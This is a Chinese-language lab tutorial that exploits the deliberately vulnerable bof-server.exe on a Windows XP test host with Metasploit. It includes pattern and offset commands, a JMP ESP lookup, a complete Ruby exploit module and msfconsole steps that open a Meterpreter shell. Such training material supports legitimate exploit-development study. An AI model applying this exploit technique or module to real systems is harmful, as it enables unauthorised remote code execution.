class="sidebar-link">SQLMap的用法+谷歌黑客语法</a></li><li><a href="/md/hack/tools/2022-04-17-017-SQLMap用法总结.html" class="sidebar-link">SQLMap用法总结</a></li><li><a href="/md/hack/tools/2022-04-17-018-SQLMap参数说明.html" class="sidebar-link">SQLMap参数说明</a></li><li><a href="/md/hack/tools/2022-04-17-019-十大渗透测试演练系统.html" class="sidebar-link">十大渗透测试演练系统</a></li><li><a href="/md/hack/tools/2022-04-17-020-目录扫描神器DirBuster用法.html" class="sidebar-link">目录扫描神器DirBuster用法</a></li><li><a href="/md/hack/tools/2022-04-17-021-NMap在实战中的常见用法.html" class="sidebar-link">NMap在实战中的常见用法</a></li><li><a href="/md/hack/tools/2022-04-17-022-Metasploit模块的格式说明.html" class="sidebar-link">Metasploit模块的格式说明</a></li><li><a href="/md/hack/tools/2022-04-17-023-Meterpreter命令大全.html" class="sidebar-link">Meterpreter命令大全</a></li><li><a href="/md/hack/tools/2022-04-17-024-Metasploit-Meterpreter-Shell信息收集相关的命令.html" class="sidebar-link">Metasploit-Meterpreter-Shell信息收集相关的命令</a></li><li><a href="/md/hack/tools/2022-04-17-025-使用Metasploit编写绕过DEP渗透模块.html" class="sidebar-link">使用Metasploit编写绕过DEP渗透模块</a></li><li><a href="/md/hack/tools/2022-04-17-026-Metasploit渗透php-utility-belt程序.html" class="sidebar-link">Metasploit渗透php-utility-belt程序</a></li><li><a href="/md/hack/tools/2022-04-17-027-内网IPC$入侵.html" class="sidebar-link">内网IPC$入侵</a></li><li><a href="/md/hack/tools/2022-04-17-028-Metasploit渗透BSPlayerV2.68.html" class="sidebar-link">Metasploit渗透BSPlayer V2.68</a></li><li><a href="/md/hack/tools/2022-04-17-029-Metasploit攻击VSFTPD2.3.4后门漏洞并渗透内网.html" class="sidebar-link">Metasploit攻击VSFTPD2.3.4后门漏洞并渗透内网</a></li><li><a href="/md/hack/tools/2022-04-17-030-Metasploit攻击PHP-CGI查询字符串参数漏洞并渗透内网.html" class="sidebar-link">Metasploit攻击PHP-CGI查询字符串参数漏洞并渗透内网</a></li><li><a href="/md/hack/tools/2022-04-17-031-Metasploit攻击HFS2.3上的漏洞.html" class="sidebar-link">Metasploit攻击HFS2.3上的漏洞</a></li><li><a href="/md/hack/tools/2022-04-17-032-Metasploit访问控制的持久化.html" class="sidebar-link">Metasploit访问控制的持久化</a></li><li><a href="/md/hack/tools/2022-04-17-033-Metasploit清除渗透痕迹.html" class="sidebar-link">Metasploit清除渗透痕迹</a></li><li><a href="/md/hack/tools/2022-04-17-034-利用Metasploit找出SCADA服务器.html" class="sidebar-link">利用Metasploit找出SCADA服务器</a></li><li><a href="/md/hack/tools/2022-04-17-035-利用Metasploit渗透DATAC-RealWin-SCADA Server2.0.html" class="sidebar-link">利用Metasploit渗透DATAC-RealWin-SCADA Server2.0</a></li><li><a href="/md/hack/tools/2022-04-17-036-MSF-Meterpreter清理日志.html" class="sidebar-link">MSF-Meterpreter清理日志</a></li><li><a href="/md/hack/tools/2022-04-17-037-Metasploit自定义FTP扫描模块.html" class="sidebar-link">Metasploit自定义FTP扫描模块</a></li><li><a href="/md/hack/tools/2022-04-17-038-Metasploit渗透MSSQL.html" class="sidebar-link">Metasploit渗透MSSQL</a></li><li><a href="/md/hack/tools/2022-04-17-039-Metasploit渗透VOIP.html" class="sidebar-link">Metasploit渗透VOIP</a></li><li><a href="/md/hack/tools/2022-04-17-040-破解工具hydra安装与使用.html" class="sidebar-link">破解工具hydra安装与使用</a></li><li><a href="/md/hack/tools/2022-04-17-041-Metasploit自定义SSH认证暴力破解器.html" class="sidebar-link">Metasploit自定义SSH认证暴力破解器</a></li><li><a href="/md/hack/tools/2022-04-17-042-Metasploit自定义让磁盘失效的后渗透模块.html" class="sidebar-link">Metasploit自定义让磁盘失效的后渗透模块</a></li><li><a href="/md/hack/tools/2022-04-17-043-PowerShell基本命令和绕过权限执行.html" class="sidebar-link">PowerShell基本命令和绕过权限执行</a></li><li><a href="/md/hack/tools/2022-05-02-001-Metasploit自定义收集登录凭证的后渗透模块.html" class="sidebar-link">Metasploit自定义收集登录凭证的后渗透模块</a></li><li><a href="/md/hack/tools/2022-05-02-002-利用Java生成穷举字典(数字+字母(大小写)+字符).html" class="sidebar-link">利用Java生成穷举字典(数字+字母(大小写)+字符)</a></li><li><a href="/md/hack/tools/2022-05-02-003-PowerShell工具之Powerup详解实录.html" class="sidebar-link">PowerShell工具之Powerup详解实录</a></li><li><a href="/md/hack/tools/2022-05-02-004-Meterpreter以被控制的计算机为跳板渗透其他服务器.html" class="sidebar-link">Meterpreter以被控制的计算机为跳板渗透其他服务器</a></li><li><a href="/md/hack/tools/2022-05-02-005-Win10完美去除桌面快捷图标小箭头.html" class="sidebar-link">Win10完美去除桌面快捷图标小箭头</a></li><li><a href="/md/hack/tools/2022-05-02-006-OpenVAS8.0-Vulnerability-Scanning.html" class="sidebar-link">OpenVAS 8.0 Vulnerability Scanning</a></li><li><a href="/md/hack/tools/2022-05-02-007-kali-Metasploit连接Postgresql默认密码.html" class="sidebar-link">kali Metasploit 连接 Postgresql 默认密码</a></li><li><a href="/md/hack/tools/2022-05-02-008-使用OpenVAS进行漏洞扫描.html" class="sidebar-link">kali 使用OpenVAS进行漏洞扫描</a></li><li><a href="/md/hack/tools/2022-05-02-009-对威胁建模附加搭建CVE2014-6287漏洞环境.html" class="sidebar-link">kali 对威胁建模(附加搭建CVE:2014-6287漏洞环境)</a></li><li><a href="/md/hack/tools/2022-05-02-010-Metasploit设置永久访问权限.html" class="sidebar-link">kali Metasploit设置永久访问权限</a></li><li><a href="/md/hack/tools/2022-05-02-011-Empire反弹回Metasploit.html" class="sidebar-link">Empire 反弹回 Metasploit</a></li><li><a href="/md/hack/tools/2022-05-02-012-Metasploit制作并运行自定义Meterpreper脚本.html" class="sidebar-link">Metasploit制作并运行自定义Meterpreper脚本</a></li><li><a href="/md/hack/tools/2022-05-02-013-使用Metasploit实现对缓冲区栈的溢出攻击.html" class="active sidebar-link">使用Metasploit实现对缓冲区栈的溢出攻击</a></li><li><a href="/md/hack/tools/2022-05-02-014-使用Metasploit实现基于SEH的缓冲区溢出攻击.html" class="sidebar-link">使用Metasploit实现基于SEH的缓冲区溢出攻击</a></li><li><a href="/md/hack/tools/2022-05-02-015-Metasploit基本后渗透命令.html" class="sidebar-link">Metasploit基本后渗透命令</a></li><li><a href="/md/hack/tools/2022-05-02-016-Metasploit高级后渗透模块.html" class="sidebar-link">Metasploit高级后渗透模块</a></li><li><a href="/md/hack/tools/2022-05-02-017-Kali中一键更新Metasploit框架.html" class="sidebar-link">Kali中一键更新Metasploit框架</a></li><li><a href="/md/hack/tools/2022-05-02-018-Metasploit其他后渗透模块.html" class="sidebar-link">Metasploit其他后渗透模块</a></li><li><a href="/md/hack/tools/2022-05-02-019-Metasploit高级扩展功能.html" class="sidebar-link">Metasploit高级扩展功能</a></li><li><a href="/md/hack/tools/2022-05-02-020-Metasploit之pushm和popm命令.html" class="sidebar-link">Metasploit之pushm和popm命令</a></li><li><a href="/md/hack/tools/2022-05-02-021-Metasploit使用reload-edit-reload_all命令加快开发过程.html" class="sidebar-link">Metasploit使用reload、edit、reload_all命令加快开发过程</a></li><li><a href="/md/hack/tools/2022-05-02-022-Metasploit资源脚本的使用方法.html" class="sidebar-link">Metasploit资源脚本的使用方法</a></li><li><a href="/md/hack/tools/2022-05-02-023-在Metasploit中使用AutoRunScript.html" class="sidebar-link">在Metasploit中使用AutoRunScript</a></li><li><a href="/md/hack/tools/2022-05-02-024-使用Metasploit获取目标的控制权限.html" class="sidebar-link">使用Metasploit获取目标的控制权限</a></li><li><a href="/md/hack/tools/2022-05-02-025-使用Metasploit中的NMap插件扫描并渗透内网主机.html" class="sidebar-link">使用Metasploit中的NMap插件扫描并渗透内网主机</a></li><li><a href="/md/hack/tools/2022-05-02-026-Kali一句话升级Metasploit的命令.html" class="sidebar-link">Kali一句话升级Metasploit的命令</a></li><li><a href="/md/hack/tools/2022-05-02-027-Win2012R2打Windows8.1-KB2919355.html" class="sidebar-link">Win2012R2打Windows8.1-KB2919355</a></li><li><a href="/md/hack/tools/2022-05-02-028-Armitage基本原理.html" class="sidebar-link">Armitage基本原理</a></li><li><a href="/md/hack/tools/2022-05-02-029-Armitage网络扫描以及主机管理.html" class="sidebar-link">Armitage网络扫描以及主机管理</a></li><li><a href="/md/hack/tools/2022-05-02-030-使用Armitage进行渗透.html" class="sidebar-link">使用Armitage进行渗透</a></li><li><a href="/md/hack/tools/2022-05-02-031-使用Armitage进行后渗透攻击.html" class="sidebar-link">使用Armitage进行后渗透攻击</a></li><li><a href="/md/hack/tools/2022-05-02-032-使用Armitage进行客户端攻击.html" class="sidebar-link">使用Armitage进行客户端攻击</a></li><li><a href="/md/hack/tools/2022-05-02-033-Armitage脚本编写.html" class="sidebar-link">Armitage脚本编写</a></li><li><a href="/md/hack/tools/2022-05-02-034-Armitage控制Metasploit.html" class="sidebar-link">Armitage控制Metasploit</a></li><li><a href="/md/hack/tools/2022-05-02-035-Armitage使用Cortana实现后渗透攻击.html" class="sidebar-link">Armitage使用Cortana实现后渗透攻击</a></li><li><a href="/md/hack/tools/2022-05-02-036-Armitage使用Cortana创建自定义菜单.html" class="sidebar-link">Armitage使用Cortana创建自定义菜单</a></li><li><a href="/md/hack/tools/2022-05-02-037-Armitage界面的使用.html" class="sidebar-link">Armitage界面的使用</a></li><li><a href="/md/hack/tools/2022-05-02-038-tcpdump用法说明.html" class="sidebar-link">tcpdump用法说明</a></li></ul></section></li></ul> </aside> <div><main class="page"> <div class="theme-default-content content__default"><h1 id="使用metasploit实现对缓冲区栈的溢出攻击"><a href="#使用metasploit实现对缓冲区栈的溢出攻击" class="header-anchor">#</a> 使用Metasploit实现对缓冲区栈的溢出攻击</h1> <p>这里我们不说理论，只讲实战，以Metasploit溢出bof-server.exe为例。</p> <h3 id="下载工具"><a href="#下载工具" class="header-anchor">#</a> 下载工具</h3> <p>这里需要下载bof-server.exe和ImmunityDebugger</p> <p>bof-server.exe 下载地址为：[http://redstack.net/blog/category/How%20To.html](http://redstack.net/blog/category/How To.html)</p> <p>ImmunityDebugger下载地址为：<a href="http://www.immunityinc.com/products/debugger/" target="_blank" rel="noopener noreferrer">http://www.immunityinc.com/products/debugger/ <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>或者 https://download.csdn.net/download/l1028386804/10918212</p> <h3 id="开启bof-server-exe监听端口"><a href="#开启bof-server-exe监听端口" class="header-anchor">#</a> 开启bof-server.exe监听端口</h3> <p>这里，我们监听200端口，具体方法为：打开cmd命令行，切换到bof-server.exe所在的目录后执行如下命令：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>bof-server.exe 200
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>此时，sof-server便开始监听200端口了。</p> <h3 id="生成字符序列"><a href="#生成字符序列" class="header-anchor">#</a> 生成字符序列</h3> <p>我们使用Metasploit中的pattern_create.rb脚本生成字符序列。首先我们查看以下pattern_create.rb脚本的帮助信息，在Kali命令行输入如下信息：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>root@binghe:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -h
+Usage: msf-pattern_create [options]
+Example: msf-pattern_create -l 50 -s ABC,def,123
+Ad1Ad2Ad3Ae1Ae2Ae3Af1Af2Af3Bd1Bd2Bd3Be1Be2Be3Bf1Bf
+
+Options:
+    -l, --length &lt;length&gt;            The length of the pattern
+    -s, --sets &lt;ABC,def,123&gt;         Custom Pattern Sets
+    -h, --help                       Show this message
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>可以看到我们只要在pattern_create.rb脚本的后面加上&quot;-l 字符序列长度&quot;就可以生成指定长度的字符序列。这里，我们生成一个长度为1000的字符序列。</p> <p>输入命令如下：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>root@binghe:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>可以看到我们生成了一个1000的字符序列</p> <h3 id="将生成的字符序列发送到bof-server-exe监听的端口"><a href="#将生成的字符序列发送到bof-server-exe监听的端口" class="header-anchor">#</a> 将生成的字符序列发送到bof-server.exe监听的端口</h3> <p>接下来我们将这个字符序列发送到bof-server.exe监听的端口。</p> <p>首先我们通过telnet连接上bof-server.exe。</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>root@binghe:~# telnet 192.168.109.141 200
+Trying 192.168.109.141...
+Connected to 192.168.109.141.
+Escape character is '^]'.
+
+&gt; 
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>接下来我们发送字符序列，将第3步生成的字符序列复制到telnet终端，回车。</p> <h3 id="查看bof-server-exe命令行"><a href="#查看bof-server-exe命令行" class="header-anchor">#</a> 查看bof-server.exe命令行</h3> <p>接着，我们查看bof-server.exe命令行状态，可以看到如下图所示：</p> <p><img alt="img" data-src="https://img-blog.csdnimg.cn/20190115162121672.png" loading="lazy" class="lazy"></p> <p>说明bof-server.exe程序发生了溢出。我们单击“请单击此处”查看详情，如下：</p> <p><img alt="img" data-src="https://img-blog.csdnimg.cn/20190115162138902.png" loading="lazy" class="lazy"></p> <p>可以看到Offset的值为：72413372</p> <h3 id="找出准确字节数量"><a href="#找出准确字节数量" class="header-anchor">#</a> 找出准确字节数量</h3> <p>这里我们用到的工具是Metasploit下的pattern_offset.rb，首先我们先查看pattern_offset.rb脚本的帮助信息，输入如下命令：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>root@binghe:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -h
+Usage: msf-pattern_offset [options]
+Example: msf-pattern_offset -q Aa3A
+[*] Exact match at offset 9
+
+Options:
+    -q, --query Aa0A                 Query to Locate
+    -l, --length &lt;length&gt;            The length of the pattern
+    -s, --sets &lt;ABC,def,123&gt;         Custom Pattern Sets
+    -h, --help                       Show this message
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>可以看到-q参数为要查询的地址，-l参数为要查询的字符序列的长度。</p> <p>根据第5步我们得出地址为：72413372，前面我们生成的字符序列的长度为1000</p> <p>所以，我们输入如下命令来得出准确字节的数量</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>root@binghe:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 72413372 -l 1000
+[*] Exact match at offset 520
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>可以看到得出的结果为520</p> <h3 id="分析bof-server-exe运行时加载的dll文件"><a href="#分析bof-server-exe运行时加载的dll文件" class="header-anchor">#</a> 分析bof-server.exe运行时加载的DLL文件</h3> <p>这里，我们通过工具ImmunityDebugger工具来分析bof-server.exe运行时加载的DLL文件，可以到http://www.immunityinc.com/products/debugger/ 或者 https://download.csdn.net/download/l1028386804/10918212 下载。</p> <p>具体操作如下：</p> <p>打开ImmunityDebugger-&gt;File-&gt;Attach，来显示目标机上运行的所有进程。</p> <p><img alt="img" data-src="https://img-blog.csdnimg.cn/20190115162431740.png" loading="lazy" class="lazy"></p> <p>打开之后，我们看到了目标机上的所有进程如下，同时，我们找到名称为bof-server.exe的进程，如下所示：</p> <p><img alt="img" data-src="https://img-blog.csdnimg.cn/20190115162512512.png" loading="lazy" class="lazy"></p> <p>接下来，我们选中bof-server.exe进程，单击右下角的Attach按钮</p> <p><img alt="img" data-src="https://img-blog.csdnimg.cn/2019011516252913.png" loading="lazy" class="lazy"></p> <p>此时，显示的是bof-server.exe的一些运行信息，如下：</p> <p><img alt="img" data-src="https://img-blog.csdnimg.cn/20190115162600358.png" loading="lazy" class="lazy"></p> <p>接下来我们选择View-&gt;Executable modules，如下图：</p> <p><img alt="img" data-src="https://img-blog.csdnimg.cn/20190115162625865.png" loading="lazy" class="lazy"></p> <p>点击后的效果如下图所示：</p> <p><img alt="img" data-src="https://img-blog.csdnimg.cn/20190115162648673.png" loading="lazy" class="lazy"></p> <p>这里，就是bof-server.exe运行加载的所有DLL文件了。这里我们选择一个ws2_32.dll文件上传到Kali的/root目录下，通过Metasploit的msfbinscan查找JMP ESP指令的地址。</p> <h3 id="查找jmp-esp指令的地址"><a href="#查找jmp-esp指令的地址" class="header-anchor">#</a> 查找JMP ESP指令的地址</h3> <p>这里，我们用到的工具是Metasploit下的msfbinscan。首先我们要进入msf命令行，在Kali终端下输入如下命令：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>msfconsole
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>查看msfbinscan的帮助信息，如下：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>msf &gt; msfbinscan -h
+[*] exec: msfbinscan -h
+
+Usage: /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/bin/msfbinscan [mode] &lt;options&gt; [targets]
+
+Modes:
+    -j, --jump [regA,regB,regC]      Search for jump equivalent instructions        [PE|ELF|MACHO]
+    -p, --poppopret                  Search for pop+pop+ret combinations            [PE|ELF|MACHO]
+    -r, --regex [regex]              Search for regex match                         [PE|ELF|MACHO]
+    -a, --analyze-address [address]  Display the code at the specified address      [PE|ELF]
+    -b, --analyze-offset [offset]    Display the code at the specified offset       [PE|ELF]
+    -f, --fingerprint                Attempt to identify the packer/compiler        [PE]
+    -i, --info                       Display detailed information about the image   [PE]
+    -R, --ripper [directory]         Rip all module resources to disk               [PE]
+        --context-map [directory]    Generate context-map files                     [PE]
+
+Options:
+    -A, --after [bytes]              Number of bytes to show after match (-a/-b)    [PE|ELF|MACHO]
+    -B, --before [bytes]             Number of bytes to show before match (-a/-b)   [PE|ELF|MACHO]
+    -I, --image-base [address]       Specify an alternate ImageBase                 [PE|ELF|MACHO]
+    -D, --disasm                     Disassemble the bytes at this address          [PE|ELF]
+    -F, --filter-addresses [regex]   Filter addresses based on a regular expression [PE]
+    -h, --help                       Show this message
+msf &gt; 
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br></div></div><p>接下来我们输入如下命令来获取JMP ESP指令的地址：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>msf &gt; msfbinscan -j esp /root/ws2_32.dll
+[*] exec: msfbinscan -j esp /root/ws2_32.dll
+
+[/root/ws2_32.dll]
+0x71a22b53 push esp; ret
+msf &gt; 
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>可以看到，我们得出的JMP ESP指令的地址为：0x71a22b53</p> <h3 id="编写攻击脚本bof-server-attack-rb"><a href="#编写攻击脚本bof-server-attack-rb" class="header-anchor">#</a> 编写攻击脚本bof_server_attack.rb</h3> <p>接下来，我们就要编写攻击脚本bof_server_attack.rb了，这里不多说了，直接上代码：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>##
+# Author 冰河
+# Date 2019-01-15
+# Description 缓冲区溢出sof-server从而拿下目标服务器Meterpreter Shell
+##
+
+require 'msf/core'
+class Metasploit3 &lt; Msf::Exploit::Remote
+  Rank = NormalRanking
+  include Msf::Exploit::Remote::Tcp
+  
+  def initialize(info = {})
+  super(update_info(info,
+    'Name' =&gt; 'Stack Based Buffer Overflow Example',
+    'Description' =&gt; %q{
+      Stack Based Overflow Example Application Exploitation Module
+    },
+    'Platform' =&gt; 'WIndows',
+    'Author' =&gt; 
+      [
+        'binghe'
+      ],
+      
+     'Payload' =&gt;
+      {
+        'space' =&gt; 1000,
+        'BadChars' =&gt; &quot;\x00\xff&quot;
+      },
+     'Targets' =&gt;
+      [
+        ['Windows XP SP3', {'Ret' =&gt; 0x71a22b53, 'Offset' =&gt; 520}]
+      ],
+     'DisclosureDate' =&gt; '2019-01-15'
+  ))
+  
+  register_options(
+  [
+    Opt::RPORT(200)
+  ],self.class)
+  end
+  
+  def exploit
+    connect
+    buf = make_nops(target['Offset'])
+    buf = buf + [target['Ret']].pack('V') + make_nops(20) + payload.encoded
+    sock.put(buf)
+    handler
+    disconnect
+   end
+end
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br></div></div><p><strong>要注意的是：</strong></p> <div class="language- line-numbers-mode"><pre class="language-text"><code>'Targets' =&gt;
+  [
+    ['Windows XP SP3', {'Ret' =&gt; 0x71a22b53, 'Offset' =&gt; 520}]
+  ],
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>中的<strong>Ret的值要和第8步中我们找到的JMP ESP指令的地址一致， Offset的值要和第6步中找出的准确字节数一致。</strong></p> <h3 id="上传bof-server-attack-rb脚本"><a href="#上传bof-server-attack-rb脚本" class="header-anchor">#</a> 上传bof_server_attack.rb脚本</h3> <p>将bof_server_attack.rb脚本上传到Kali的/usr/share/metasploit-framework/modules/exploits/windows/masteringmetasploit/目录下。</p> <h3 id="运行攻击脚本"><a href="#运行攻击脚本" class="header-anchor">#</a> 运行攻击脚本</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>msfconsole
+use exploit/windows/masteringmetasploit/bof_server_attack
+set payload windows/meterpreter/bind_tcp
+show options
+set RHOST 192.168.109.141
+show options
+exploit
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>此时我们拿到了目标服务器的Meterpreter Shell，如下图所示：</p> <p><img alt="img" data-src="https://img-blog.csdnimg.cn/20190115163113304.png" loading="lazy" class="lazy"></p> <p>此时，我们查看目标服务器的bof-server.exe终端，如下图所示：</p> <p><img alt="img" data-src="https://img-blog.csdnimg.cn/20190115163127479.png" loading="lazy" class="lazy"></p> <h3 id="可能出现的问题"><a href="#可能出现的问题" class="header-anchor">#</a> 可能出现的问题</h3> <p>有时我们运行exploit进行渗透拿Meterpreter Shell的时候，会出现不成功的情况，具体如下图：</p> <p><img alt="img" data-src="https://img-blog.csdnimg.cn/20190115163145761.png" loading="lazy" class="lazy"></p> <p>此时，查看目标机的bof-server.exe命令行的缓冲区溢出并断开了监听。</p> <p><img alt="img" data-src="https://img-blog.csdnimg.cn/20190115163207581.png" loading="lazy" class="lazy"></p> <p>此时，只需要在目标机上多运行几次bof-server.exe 200和在Kali上多运行几次exploit，直到成功拿到Meterpreter Shell。</p> <h2 id="写在最后"><a href="#写在最后" class="header-anchor">#</a> 写在最后</h2> <blockquote><p>如果你觉得冰河写的还不错，请微信搜索并关注「 <strong>冰河技术</strong> 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 <strong>冰河技术</strong> 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 <strong>冰河技术</strong> 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 <strong>冰河技术</strong> 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！</p></blockquote> <p><img alt="" data-src="https://img-blog.csdnimg.cn/20200906013715889.png" loading="lazy" class="lazy"></p></div> <footer class="page-edit"><div class="edit-link"><a href="https://github.com/binghe001/BingheGuide/edit/master/docs/md/hack/tools/2022-05-02-013-使用Metasploit实现对缓冲区栈的溢出攻击.md" target="_blank" rel="noopener noreferrer">在 GitHub 上编辑此页</a> <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></div> <div class="last-updated"><span 